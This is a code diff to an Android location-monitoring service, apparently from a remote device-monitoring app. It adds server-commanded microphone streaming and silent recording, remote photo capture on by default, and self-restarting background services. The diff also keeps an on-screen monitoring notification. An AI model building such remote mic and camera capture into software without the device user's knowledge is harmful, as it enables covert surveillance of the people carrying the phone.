@@ -6,12 +6,14 @@ import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
 import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
 import android.location.Location
 import android.os.Build
 import android.os.IBinder
 import android.os.Looper
 import android.util.Log
 import android.widget.Toast
+import androidx.core.app.ServiceCompat
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.*
@@ -40,6 +42,26 @@ class LocationService : Service() {
         const val ACTION_START = "start"
         const val ACTION_STOP = "stop"
         const val ACTION_EMERGENCY_STOP = "emergency_stop"
+        const val ACTION_START_AUDIO_STREAM = "start_audio_stream"
+        const val ACTION_STOP_AUDIO_STREAM = "stop_audio_stream"
+        const val EXTRA_AUDIO_RECORDING = "audio_recording"
+        const val EXTRA_AUDIO_SAMPLE_RATE = "audio_sample_rate"
+
+        fun requestAudioStart(context: Context, recording: Boolean, sampleRate: Int = 24_000) {
+            val intent = Intent(context, LocationService::class.java).apply {
+                action = ACTION_START_AUDIO_STREAM
+                putExtra(EXTRA_AUDIO_RECORDING, recording)
+                putExtra(EXTRA_AUDIO_SAMPLE_RATE, sampleRate)
+            }
+            context.startService(intent)
+        }
+
+        fun requestAudioStop(context: Context) {
+            val intent = Intent(context, LocationService::class.java).apply {
+                action = ACTION_STOP_AUDIO_STREAM
+            }
+            context.startService(intent)
+        }
     }
 
     private lateinit var fusedLocationClient: FusedLocationProviderClient
@@ -82,6 +104,20 @@ class LocationService : Service() {
             ACTION_START -> startTracking(intent)
             ACTION_STOP -> stopTracking()
             ACTION_EMERGENCY_STOP -> emergencyStopAll()
+            ACTION_START_AUDIO_STREAM -> {
+                if (!isTracking) {
+                    Log.w(TAG, "Ignoring audio start: monitoring service is not active")
+                    return START_STICKY
+                }
+                val recording = intent.getBooleanExtra(EXTRA_AUDIO_RECORDING, false)
+                val sampleRate = intent.getIntExtra(EXTRA_AUDIO_SAMPLE_RATE, 24_000)
+                startAudioStreaming(recording = recording, sampleRate = sampleRate)
+            }
+            ACTION_STOP_AUDIO_STREAM -> {
+                if (isStreamingAudio) {
+                    stopAudioStreaming()
+                }
+            }
             null -> {
                 // Service restarted by system, resume tracking if it was running
                 Log.d(TAG, "Service restarted by system, resuming tracking")
@@ -101,7 +137,7 @@ class LocationService : Service() {
         }
 
         // Start foreground service FIRST to avoid crash
-        startForeground(NOTIFICATION_ID, createNotification())
+        promoteToForeground()
 
         // Load settings (prefer intent extras to avoid async prefs race)
         val intentDeviceId = startIntent?.getStringExtra("device_id")?.takeIf { it.isNotBlank() }
@@ -139,17 +175,14 @@ class LocationService : Service() {
 
         isTracking = true
         locationUpdatesStarted = false
+        ChatBackgroundService.start(this, serverUrl!!, deviceId!!)
+        PhotoCaptureService.start(this, serverUrl!!, deviceId!!)
         // Register device with retries (network may be unavailable right after boot)
         startRegistrationLoop()
         prefs.edit().putBoolean("service_running", true).apply()
 
-        // AUTO-START AUDIO STREAMING - Simplified architecture
-        // Start audio streaming automatically when service starts
-        serviceScope.launch {
-            delay(1000) // Faster start to reduce perceived delay
-            startAudioStreaming(recording = false)
-            Log.d(TAG, "🎙️ Auto-started audio streaming (simplified architecture)")
-        }
+        // Audio listening starts only from an explicit start_audio_stream command.
+        // Auto-start here races with the dedicated WebSocket audio path and can grab the mic too early.
     }
 
     private fun startRegistrationLoop() {
@@ -162,7 +195,11 @@ class LocationService : Service() {
                     if (ok) {
                         Log.d(TAG, "Device registered")
                         withContext(Dispatchers.Main) {
-                            Toast.makeText(this@LocationService, "Мониторинг активен", Toast.LENGTH_SHORT).show()
+                            Toast.makeText(
+                                this@LocationService,
+                                getString(R.string.location_service_monitoring_active),
+                                Toast.LENGTH_SHORT
+                            ).show()
                         }
                         startLocationUpdates()
                         locationUpdatesStarted = true
@@ -255,7 +292,9 @@ class LocationService : Service() {
 
             if (success) {
                 val batteryStatus = DeviceInfoCollector.getBatteryStatus(this@LocationService)
-                updateNotification("Активно • $batteryStatus")
+                updateNotification(
+                    getString(R.string.location_service_notification_active_with_battery, batteryStatus)
+                )
             }
         }
     }
@@ -276,7 +315,8 @@ class LocationService : Service() {
         }
     }
 
-    private fun createNotification(contentText: String = "Отслеживание активно"): Notification {
+    private fun createNotification(contentText: String? = null): Notification {
+        val resolvedContentText = contentText ?: getString(R.string.location_service_notification_active)
         val notificationIntent = Intent(this, MainActivity::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this, 0, notificationIntent,
@@ -285,12 +325,26 @@ class LocationService : Service() {
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle(getString(R.string.app_name))
-            .setContentText(contentText)
+            .setContentText(resolvedContentText)
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
             .setSilent(true)
             .build()
+    }
+
+    private fun promoteToForeground(contentText: String? = null) {
+        val notification = createNotification(contentText)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            ServiceCompat.startForeground(
+                this,
+                NOTIFICATION_ID,
+                notification,
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            )
+        } else {
+            startForeground(NOTIFICATION_ID, notification)
+        }
     }
 
     private fun updateNotification(text: String) {
@@ -307,6 +361,7 @@ class LocationService : Service() {
             while (isTracking) {
                 try {
                     checkStreamingCommands()
+                    ensureBackgroundServicesHealthy()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error checking commands", e)
                 }
@@ -356,21 +411,45 @@ class LocationService : Service() {
                 )
             )
 
+            val wsAudioOwnerActive = ChatBackgroundService.isRunning
+
             when (command.type) {
                 "start_audio_stream" -> {
                     val sampleRate = command.data?.optInt("sampleRate", 24_000) ?: 24_000
-                    startAudioStreaming(recording = false, sampleRate = sampleRate)
+                    val recording = command.data?.optBoolean("recording", false) ?: false
+                    if (wsAudioOwnerActive) {
+                        Log.w(
+                            TAG,
+                            "Polled start_audio_stream received while WS owner is active - using service backstop"
+                        )
+                        AudioStreamingService.startStreaming(
+                            this,
+                            deviceId,
+                            serverUrl,
+                            recording,
+                            sampleRate
+                        )
+                    } else {
+                        startAudioStreaming(recording = recording, sampleRate = sampleRate)
+                    }
                 }
                 "stop_audio_stream" -> {
-                    stopAudioStreaming()
+                    AudioStreamingService.stopStreaming(this)
+                    if (!wsAudioOwnerActive || isStreamingAudio) {
+                        stopAudioStreaming()
+                    }
                 }
                 "start_recording" -> {
-                    audioRecorder.setRecordingMode(true)
-                    Log.d(TAG, "Recording mode enabled (silent)")
+                    if (!wsAudioOwnerActive) {
+                        audioRecorder.setRecordingMode(true)
+                        Log.d(TAG, "Recording mode enabled (silent)")
+                    }
                 }
                 "stop_recording" -> {
-                    audioRecorder.setRecordingMode(false)
-                    Log.d(TAG, "Recording mode disabled (silent)")
+                    if (!wsAudioOwnerActive) {
+                        audioRecorder.setRecordingMode(false)
+                        Log.d(TAG, "Recording mode disabled (silent)")
+                    }
                 }
             }
         }
@@ -443,6 +522,7 @@ class LocationService : Service() {
 
         audioRecorder.startStreaming(deviceId, serverUrl, recording, sampleRate)
         isStreamingAudio = true
+        updateNotification(getString(R.string.location_service_notification_active_with_battery, DeviceInfoCollector.getBatteryStatus(this)))
 
         Log.d(TAG, "Audio streaming started (silent mode)")
         RemoteLogger.info(
@@ -467,6 +547,7 @@ class LocationService : Service() {
 
         audioRecorder.stopStreaming()
         isStreamingAudio = false
+        updateNotification(getString(R.string.location_service_notification_active))
 
         Log.d(TAG, "Audio streaming stopped (silent mode)")
         RemoteLogger.info(
@@ -477,6 +558,25 @@ class LocationService : Service() {
         )
     }
 
+    private fun ensureBackgroundServicesHealthy() {
+        val deviceId = this.deviceId?.takeIf { it.isNotBlank() } ?: return
+        val serverUrl = this.serverUrl?.takeIf { it.isNotBlank() } ?: return
+
+        if (!ChatBackgroundService.isRunning) {
+            Log.w(TAG, "ChatBackgroundService is down, restarting from LocationService")
+            ChatBackgroundService.start(this, serverUrl, deviceId)
+        }
+
+        if (AudioStreamingService.isStreamingDesired(this)) {
+            AudioStreamingService.resumeIfDesired(this)
+        }
+
+        val allowRemotePhoto = prefs.getBoolean("allow_remote_photo", true)
+        if (allowRemotePhoto) {
+            PhotoCaptureService.start(this, serverUrl, deviceId)
+        }
+    }
+
     override fun onBind(intent: Intent?): IBinder? = null
 
     /**
@@ -484,26 +584,26 @@ class LocationService : Service() {
      * Used when user wants to ensure everything is stopped (audio streaming, location tracking, etc.)
      */
     private fun emergencyStopAll() {
-        Log.w(TAG, "🚨 EMERGENCY STOP - Stopping all functions")
+        Log.w(TAG, "EMERGENCY STOP - Stopping all functions")
 
         // Stop audio streaming immediately
         if (isStreamingAudio) {
             stopAudioStreaming()
-            Log.d(TAG, "✅ Audio streaming stopped")
+            Log.d(TAG, "Audio streaming stopped")
         }
 
         // Stop location tracking
         stopTracking()
-        Log.d(TAG, "✅ Location tracking stopped")
+        Log.d(TAG, "Location tracking stopped")
 
         // Cancel all coroutines
         commandCheckJob?.cancel()
-        Log.d(TAG, "✅ Command checking stopped")
+        Log.d(TAG, "Command checking stopped")
 
         // Show notification
-        Toast.makeText(this, "🚨 Экстренная остановка - все функции выключены", Toast.LENGTH_LONG).show()
+        Toast.makeText(this, getString(R.string.location_service_emergency_stop_done), Toast.LENGTH_LONG).show()
 
-        Log.w(TAG, "🚨 EMERGENCY STOP COMPLETED")
+        Log.w(TAG, "EMERGENCY STOP COMPLETED")
     }
 
     override fun onDestroy() {
